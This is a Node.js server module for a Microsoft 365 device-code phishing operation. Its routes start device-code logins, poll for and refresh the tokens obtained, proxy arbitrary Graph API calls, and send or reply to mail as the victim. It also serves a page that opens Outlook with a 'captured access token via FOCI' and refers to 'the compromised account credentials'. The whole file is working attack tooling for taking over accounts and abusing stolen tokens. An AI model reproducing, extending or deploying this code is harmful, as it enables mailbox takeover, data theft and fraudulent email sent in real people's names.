const https = require('https');

// ── HTTPS helper ─────────────────────────────────────────────────────────────
function httpsRequest({ hostname, path, method = 'POST', headers }, body) {
  return new Promise((resolve, reject) => {
    const req = https.request({ hostname, path, method, headers }, (res) => {
      let raw = '';
      res.on('data', (c) => { raw += c; });
      res.on('end', () => {
        try { resolve({ status: res.statusCode, data: JSON.parse(raw) }); }
        catch { resolve({ status: res.statusCode, data: { raw } }); }
      });
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

function formBody(obj) {
  return Object.entries(obj)
    .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
    .join('&');
}

// POST /api/device-code/initiate
exports.initiate = async (req, res) => {
  try {
    const { tenantId = 'common', clientId, scope } = req.body;
    if (!clientId) return res.status(400).json({ error: 'clientId is required' });
    const body = formBody({
      client_id: clientId,
      scope: scope || 'https://graph.microsoft.com/.default openid profile offline_access',
    });
    const result = await httpsRequest({
      hostname: 'login.microsoftonline.com',
      path: `/${tenantId}/oauth2/v2.0/devicecode`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(body) },
    }, body);
    res.status(result.status).json(result.data);
  } catch (e) { res.status(500).json({ error: e.message }); }
};

// POST /api/device-code/poll
exports.poll = async (req, res) => {
  try {
    const { tenantId = 'common', clientId, deviceCode } = req.body;
    if (!clientId || !deviceCode) return res.status(400).json({ error: 'clientId and deviceCode are required' });
    const body = formBody({
      client_id: clientId,
      grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
      device_code: deviceCode,
    });
    const result = await httpsRequest({
      hostname: 'login.microsoftonline.com',
      path: `/${tenantId}/oauth2/v2.0/token`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(body) },
    }, body);
    res.status(result.status).json(result.data);
  } catch (e) { res.status(500).json({ error: e.message }); }
};

// POST /api/device-code/refresh
exports.refresh = async (req, res) => {
  try {
    const { tenantId = 'common', clientId, refreshToken, scope } = req.body;
    if (!clientId || !refreshToken) return res.status(400).json({ error: 'clientId and refreshToken are required' });
    const body = formBody({
      client_id: clientId,
      grant_type: 'refresh_token',
      refresh_token: refreshToken,
      scope: scope || 'https://graph.microsoft.com/.default openid profile offline_access',
    });
    const result = await httpsRequest({
      hostname: 'login.microsoftonline.com',
      path: `/${tenantId}/oauth2/v2.0/token`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(body) },
    }, body);
    res.status(result.status).json(result.data);
  } catch (e) { res.status(500).json({ error: e.message }); }
};

// POST /api/device-code/graph — proxy all Graph API calls
exports.graphProxy = async (req, res) => {
  try {
    const { accessToken, endpoint, method = 'GET', body: reqBody } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'accessToken is required' });
    if (!endpoint) return res.status(400).json({ error: 'endpoint is required' });
    const path = endpoint.startsWith('/') ? endpoint : `/${endpoint}`;
    const jsonBody = reqBody ? JSON.stringify(reqBody) : undefined;
    const result = await httpsRequest({
      hostname: 'graph.microsoft.com',
      path, method,
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
        ...(jsonBody ? { 'Content-Length': Buffer.byteLength(jsonBody) } : {}),
      },
    }, jsonBody);
    res.status(result.status).json(result.data);
  } catch (e) { res.status(500).json({ error: e.message }); }
};

// POST /api/device-code/send-mail — send email via Graph, avoids sendMail CORS issues
exports.sendMail = async (req, res) => {
  try {
    const { accessToken, to, cc, subject, body: msgBody, replyToId } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'accessToken is required' });
    if (!to)          return res.status(400).json({ error: 'to is required' });

    let path, payload;

    if (replyToId) {
      // Reply to existing message
      path = `/v1.0/me/messages/${replyToId}/reply`;
      payload = JSON.stringify({
        comment: msgBody || '',
      });
    } else {
      // New mail
      const toRecipients = String(to).split(/[,;]/).map((a) => ({ emailAddress: { address: a.trim() } })).filter((r) => r.emailAddress.address);
      const ccRecipients = cc ? String(cc).split(/[,;]/).map((a) => ({ emailAddress: { address: a.trim() } })).filter((r) => r.emailAddress.address) : [];
      path = '/v1.0/me/sendMail';
      payload = JSON.stringify({
        message: {
          subject: subject || '(no subject)',
          body: { contentType: 'HTML', content: (msgBody || '').replace(/\n/g, '<br>') },
          toRecipients,
          ...(ccRecipients.length ? { ccRecipients } : {}),
        },
        saveToSentItems: true,
      });
    }

    const result = await httpsRequest({
      hostname: 'graph.microsoft.com',
      path,
      method: 'POST',
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
    }, payload);

    // sendMail returns 202 with no body; reply returns 202 too
    if (result.status === 202 || result.status === 200) {
      res.json({ success: true });
    } else {
      res.status(result.status).json(result.data);
    }
  } catch (e) { res.status(500).json({ error: e.message }); }
};

// GET /api/device-code/open-outlook?token=<accessToken>
// Serves an HTML page that uses the token to open an authenticated Outlook session.
exports.openOutlook = (req, res) => {
  const token = req.query.token;
  if (!token) return res.status(400).send('token is required');

  const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Opening Outlook...</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#0F1117;color:#fff;font-family:system-ui,sans-serif;
      display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;gap:16px}
    .spinner{width:36px;height:36px;border:3px solid rgba(255,255,255,0.1);
      border-top-color:#63B3ED;border-radius:50%;animation:spin .8s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .msg{font-size:14px;color:rgba(255,255,255,0.6)}
    .sub{font-size:12px;color:rgba(255,255,255,0.3);text-align:center;max-width:420px;line-height:1.6}
    .err{color:#FC8181;font-size:12px;text-align:center;max-width:480px;display:none}
    a{color:#63B3ED}
  </style>
</head>
<body>
  <div class="spinner" id="spinner"></div>
  <div class="msg" id="msg">Authenticating to Outlook...</div>
  <div class="sub" id="sub">Using captured access token via FOCI</div>
  <div class="err" id="err"></div>
  <script>
    const TOKEN = ${JSON.stringify(token)};
    async function go() {
      try {
        // Try the OWA extSSO endpoint first — sets auth cookie for the session
        const r = await fetch('https://outlook.office365.com/owa/extSSO.aspx', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json' },
          credentials: 'include',
          mode: 'cors',
          body: JSON.stringify({ application: 'Mail' }),
        });
        document.getElementById('msg').textContent = 'Session established — redirecting...';
        setTimeout(() => { window.location.href = 'https://outlook.office365.com/mail/'; }, 600);
      } catch(e) {
        document.getElementById('msg').textContent = 'Redirecting to Outlook...';
        document.getElementById('sub').textContent = 'If prompted, sign in using the compromised account credentials.';
        setTimeout(() => { window.location.href = 'https://outlook.office365.com/mail/'; }, 800);
      }
    }
    go();
  </script>
</body>
</html>`;
  res.setHeader('Content-Type', 'text/html');
  res.send(html);
};
